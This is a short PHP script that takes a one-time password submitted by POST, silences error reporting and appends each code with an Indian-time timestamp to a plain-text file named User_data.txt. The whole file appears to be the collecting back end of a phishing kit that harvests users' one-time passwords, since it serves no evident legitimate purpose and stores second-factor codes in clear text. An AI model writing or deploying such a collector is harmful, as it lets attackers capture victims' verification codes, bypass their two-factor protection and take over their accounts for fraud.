<?php
error_reporting(0);

// Set timezone to India
date_default_timezone_set("Asia/Kolkata");

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $otp = trim($_POST['otp'] ?? '');

    $date = date("Y-m-d");
    $time = date("h:i:s A");

    $log  = "-----------------------------------------------------------\n";
    $log .= "OTP: $otp\n";
    $log .= "Time: $time | Date: $date\n";

    file_put_contents("User_data.txt", $log, FILE_APPEND);
    echo "Saved!";
} else {
    echo "Invalid request";
}
?>